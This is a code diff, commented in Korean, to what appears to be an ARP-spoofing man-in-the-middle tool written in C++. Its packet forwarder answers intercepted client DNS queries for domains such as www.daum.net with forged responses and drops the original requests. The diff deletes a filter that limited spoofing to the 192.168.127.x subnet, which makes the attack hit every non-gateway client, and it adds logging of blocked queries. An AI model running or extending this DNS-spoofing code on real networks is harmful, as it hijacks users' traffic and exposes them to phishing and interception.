@@ -28,12 +28,6 @@ const int MAX_DNS_HISTORY = 256;  // 추적할 최대 요청 수
 DnsRequest recent_dns_requests[MAX_DNS_HISTORY];
 int dns_history_index = 0;
 
-// 서브넷 기반 추가 필터링
-bool is_in_spoofed_subnet(const u_int8_t* ip) {
-    // 예: 192.168.127.x 네트워크의 패킷만 스푸핑
-    return ip[0] == 192 && ip[1] == 168 && ip[2] == 127;
-}
-
 PacketForwarder::PacketForwarder(pcap_t* handle, ArpSpoofer* spoofer)
     : handle(handle), spoofer(spoofer), running(false) {}
 
@@ -135,9 +129,7 @@ void PacketForwarder::forward_loop()
                 }
                 
                 // 2. 클라이언트의 DNS 요청 처리
-                if (dport == DNS_PORT && !ip_equals(src_ip, spoofer->get_gateway_ip()) &&
-                    is_in_spoofed_subnet(src_ip)) {  // 추가 필터링으로 대상 제한
-                    
+                if (dport == DNS_PORT && !ip_equals(src_ip, spoofer->get_gateway_ip())) {
                     auto dns_start = high_resolution_clock::now();
                     
                     // DNS 요청 분석
@@ -183,22 +175,25 @@ void PacketForwarder::forward_loop()
                                              domain.find("www.daum.net") != string::npos);
                         
                         if (should_spoof) {
-                            // 즉시 DNS 응답 스푸핑
+                            // 원본 패킷 복사
                             u_int8_t* packet_copy = new u_int8_t[header->len];
                             memcpy(packet_copy, packet_data, header->len);
                             
+                            // DNS 응답 스푸핑 - 요청을 포워딩하지 않고 직접 응답
                             send_dns_spoof_response(handle, packet_copy, header->len,
                                 spoofer->get_attacker_mac(), spoofer->get_gateway_ip(),
                                 domain, spoofer->get_targets());
                             
+                            // 메모리 해제
                             delete[] packet_copy;
                             
                             auto dns_end = high_resolution_clock::now();
                             auto duration = duration_cast<microseconds>(dns_end - dns_start).count();
                             cout << "DNS 스푸핑 처리 시간: " << duration << "μs\n";
                             
-                            // 원래 요청은 게이트웨이로 포워딩하지 않고 차단
-                            continue;
+                            // 원본 DNS 요청은 게이트웨이로 포워딩하지 않음
+                            cout << "원본 DNS 요청 차단: " << domain << " (TxID: 0x" << hex << dns_id << dec << ")\n";
+                            continue;  // 다음 패킷으로
                         }
                     } else {
                         cout << "이미 처리된 DNS 요청 무시\n";
